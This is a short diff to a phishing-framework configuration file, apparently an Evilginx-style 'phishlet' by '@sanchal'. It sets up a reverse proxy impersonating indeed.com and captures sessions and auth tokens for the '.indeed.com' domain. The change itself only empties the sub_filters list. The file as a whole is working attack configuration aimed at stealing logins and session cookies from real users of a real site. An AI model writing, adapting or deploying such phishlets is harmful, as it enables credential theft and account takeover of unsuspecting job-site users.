@@ -2,8 +2,7 @@ author: '@sanchal'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'secure', orig_sub: 'www', domain: 'indeed.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'secure.indeed.com', orig_sub: 'secure', domain: 'indeed.com', search: 'https://{hostname}/auth/', replace: 'https://{hostname}/auth/', mimes: ['text/html', 'application/json', 'application/javascript']}
+sub_filters: []
 auth_tokens:
   - domain: '.indeed.com'
     keys: []
